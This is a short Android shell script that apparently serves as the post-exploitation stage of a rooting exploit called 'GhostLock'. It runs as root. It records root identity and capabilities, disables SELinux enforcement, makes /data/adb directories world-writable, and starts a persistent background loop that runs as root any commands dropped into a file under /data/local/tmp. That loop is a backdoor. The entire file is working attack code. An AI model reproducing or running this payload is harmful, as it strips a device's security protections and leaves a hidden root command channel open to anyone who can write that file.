#!/system/bin/sh
# GhostLock root payload — executed by the punched child (uid 0)
R=/data/local/tmp/ROOTED_ID.txt
{
  echo "=== ROOT $(date) ==="
  id
  cat /proc/self/status | grep -E "^Uid|^Gid|^Cap"
} > $R 2>&1
setenforce 0 >> $R 2>&1
getenforce >> $R 2>&1
mkdir -p /data/adb/ksu >> $R 2>&1
chmod 777 /data/adb /data/adb/ksu >> $R 2>&1
# persistent root command runner (nosuid mount): cmds via /data/local/tmp/rcmd
(while :; do
  if [ -f /data/local/tmp/rcmd ]; then
    sh /data/local/tmp/rcmd > /data/local/tmp/rout 2>&1
    mv /data/local/tmp/rcmd /data/local/tmp/rcmd.done
  fi
  sleep 1
done) &
sleep 3600 &
